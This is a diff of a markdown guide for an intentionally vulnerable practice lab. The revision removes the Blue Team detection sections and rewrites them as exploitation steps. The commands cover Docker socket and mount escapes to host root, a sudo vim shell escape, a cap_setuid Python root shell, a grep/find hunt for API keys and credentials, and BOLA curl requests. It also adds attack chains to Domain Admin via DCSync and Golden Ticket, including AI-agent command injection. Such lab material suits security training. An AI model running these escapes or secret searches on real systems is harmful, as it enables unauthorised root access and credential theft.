 mount /dev/sda1 /mnt/host
-chroot /mnt/host
-# Now on HOST as root
+chroot /mnt/host bash
+
+# Now on host as root
 ```
 
-### 🔵 Blue Team
-
-**Detection:**
-```bash
-# Monitor mount syscalls
-sudo ausearch -sc mount -i
-
-# Docker events
-docker events --filter 'type=container'
-```
+### Result
+**Root on host**.
 
 ---
 
-## 🔓 VECTOR 13: Docker Socket Mount
+## VULN 17: Docker Socket Escape
 
-| Property | Value |
-|----------|-------|
-| **Container** | `vuln_sock` |
-| **Vulnerability** | `/var/run/docker.sock` mounted |
-| **Tools** | docker CLI |
+### What It Is
+A container with the Docker socket mounted can communicate with the Docker daemon to spawn new privileged containers.
 
-### 🔴 Red Team
+### Why It Works
+Access to `/var/run/docker.sock` = Access to Docker daemon = Ability to create containers with host access.
 
-**1. Enter Container:**
+### Configuration
+- **Container:** `vuln_sock`
+- **Mount:** `/var/run/docker.sock:/var/run/docker.sock`
+
+### Exploitation
+
 ```bash
+# Enter container
 docker exec -it container_lab-vuln_sock-1 bash
-```
 
-**2. Install Docker CLI:**
-```bash
+# Install docker CLI
 apt update && apt install -y docker.io
-```
 
-**3. Spawn Privileged Container:**
-```bash
+# Escape via new privileged container
 docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host
-# Now on HOST as root
+
+# Now on host as root
 ```
 
-### 🔵 Blue Team
-
-**Detection:**
-```bash
-# Monitor docker socket access
-sudo ausearch -f /var/run/docker.sock
-
-# Watch for new containers
-docker events --filter 'event=create'
-```
+### Result
+**Root on host**.
 
 ---
 
-## 🔓 VECTOR 14: Sudo Misconfiguration
+## VULN 18: Sudo Misconfiguration
 
-| Property | Value |
-|----------|-------|
-| **User** | `vagrant` |
-| **Vulnerability** | `NOPASSWD: /usr/bin/vim` |
-| **Tools** | Terminal |
+### What It Is
+The `vagrant` user can run `vim` as root without a password, and vim can spawn a shell.
 
-### 🔴 Red Team
+### Why It Works
+Vim has the ability to execute shell commands (`:!command`), so passwordless sudo to vim = passwordless root.
 
-**Escape to Root:**
+### Configuration
+- **Sudoers:** `vagrant ALL=(ALL) NOPASSWD: /usr/bin/vim`
+
+### Exploitation
+
 ```bash
+# Escape via vim
 sudo vim -c ':!/bin/bash'
-# Now root!
-```
 
-**Alternative:**
-```bash
+# Alternative
 sudo vim
 :set shell=/bin/bash
 :shell
 ```
 
-### 🔵 Blue Team
-
-**Detection:**
-```bash
-# Monitor sudo commands
-sudo ausearch -m USER_CMD -i | grep vim
-```
+### Result
+**Root shell**.
 
 ---
 
-## 🔓 VECTOR 15: Hardcoded API Secrets
+## VULN 19: Linux Capabilities Abuse
 
-| Property | Value |
-|----------|-------|
-| **Location** | `/home/vagrant/exfil_lab/.env` |
-| **Contents** | Fake AWS/Stripe keys |
-| **Tools** | grep, find |
+### What It Is
+A copy of Python has the `cap_setuid` capability, allowing it to change its UID to 0 (root).
 
-### 🔴 Red Team
+### Why It Works
+Linux capabilities grant specific privileges to executables. `cap_setuid` allows changing the process's user ID.
 
-**Find and Extract:**
+### Configuration
+- **Binary:** `/usr/local/bin/python_cap`
+- **Capability:** `cap_setuid+ep`
+
+### Exploitation
+
+```bash
+/usr/local/bin/python_cap -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+
+### Result
+**Root shell**.
+
+---
+
+## VULN 20: Hardcoded Secrets
+
+### What It Is
+Configuration files contain hardcoded API keys and credentials.
+
+### Configuration
+- **File:** `/home/vagrant/exfil_lab/.env`
+
+### Discovery
+
 ```bash
 cat /home/vagrant/exfil_lab/.env
 # API_KEY=sk_live_1234567890abcdef
 # AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
 
-# Search for more secrets
-grep -r "API_KEY\|SECRET\|PASSWORD" /home/vagrant/ 2>/dev/null
+# Search for more
+grep -r "API_KEY\|SECRET\|PASSWORD" /home 2>/dev/null
 find / -name "*.env" 2>/dev/null
 ```
 
-### 🔵 Blue Team
-
-**Detection:**
-```bash
-# Monitor sensitive file access
-sudo auditctl -w /home/vagrant/exfil_lab/.env -p r -k secrets
-sudo ausearch -k secrets
-```
-
 ---
 
-## 🔓 VECTOR 16: API Logic Flaws (vAPI & crAPI)
+## VULN 21: API Security Flaws
 
-| Property | Value |
-|----------|-------|
-| **vAPI** | `http://10.0.0.20:5002` |
-| **crAPI** | `http://10.0.0.20:8888` |
-| **Vulnerabilities** | BOLA/IDOR, Mass Assignment |
-| **Tools** | Postman, Burp Suite |
+### What It Is
+Multiple OWASP-style vulnerable APIs are deployed for practicing API security testing.
 
-### 🔴 Red Team
+### Targets
+| App | Port | Vulnerabilities |
+|-----|------|-----------------|
+| Juice Shop | 3000 | XSS, SQLi, Auth bypass |
+| vAPI | 5002 | BOLA, Mass Assignment |
+| crAPI | 8888 | BOLA, IDOR, JWT issues |
 
-**BOLA/IDOR (Access Other Users):**
+### Exploration
+
 ```bash
-# Get your user ID
+# Juice Shop
+curl http://10.0.0.20:3000
+
+# vAPI
+curl http://10.0.0.20:5002
+
+# BOLA example (access other users)
 curl http://10.0.0.20:5002/api/users/1
-
-# Try other IDs
-curl http://10.0.0.20:5002/api/users/2
-curl http://10.0.0.20:5002/api/users/3
-```
-
-**Mass Assignment:**
-```bash
-# Try to set admin flag
-curl -X POST http://10.0.0.20:5002/api/users -d '{"username":"test","password":"test","isAdmin":true}'
-```
-
-### 🔵 Blue Team
-
-**Detection:**
-- Monitor for sequential ID access patterns
-- Alert on privilege escalation attempts
-- Log all API authentication events
-
----
-
-# BLUE TEAM QUICK REFERENCE
-
-## Key Windows Events (DC01)
-
-| Event ID | Description |
-|----------|-------------|
-| 4768 | Kerberos TGT Request (AS-REP) |
-| 4769 | Kerberos TGS Request (Kerberoast) |
-| 4886 | Certificate Request |
-| 4887 | Certificate Issued |
-| 4104 | PowerShell ScriptBlock |
-| 4688 | Process Creation |
-
-## Key Linux Monitoring (Web01)
-
-```bash
-# auditd - all recent events
-sudo ausearch -ts recent -i
-
-# SMB share monitoring
-sudo ausearch -f /home/vagrant/share -i
-
-# Cron monitoring
-sudo tail -f /var/log/syslog | grep CRON
-
-# Docker monitoring
-docker events --filter 'type=container'
+curl http://10.0.0.20:5002/api/users/2  # Different user's data
 ```
 
 ---
 
-*End of Guide. Hunt well.* 🎯
+# 🛠️ RECOMMENDED TOOLS
+
+| Category | Tools |
+|----------|-------|
+| AD Attacks | Impacket, Rubeus, Mimikatz, BloodHound |
+| Web Testing | Burp Suite, SQLMap, ffuf |
+| Linux Privesc | linPEAS, GTFOBins |
+| Containers | deepce, kubectl |
+| General | netcat, curl, CrackMapExec |
+
+---
+
+# 📚 ATTACK CHAIN SUGGESTIONS
+
+### Path 1: Web → SQLi → OS Command → AD Compromise
+1. SQL Injection on HR Portal
+2. Enable xp_cmdshell
+3. Dump credentials or add user
+4. DCSync or Golden Ticket
+
+### Path 2: Kerberos → Domain Admin
+1. AS-REP Roast `svc_backup`
+2. Kerberoast `svc_sql`
+3. Use SQL sysadmin for OS access
+4. DCSync with Domain Admin
+
+### Path 3: SMB → Root → Domain
+1. Anonymous SMB to `backup_drop`
+2. Upload shell script
+3. Root shell via cron
+4. Use domain credentials from memory
+
+### Path 4: Web → Container → Host
+1. AI Agent command injection
+2. Enumerate containers
+3. Docker socket escape
+4. Root on host
+
+---
+
+**Hunt. Adapt. Overcome.** ☠️
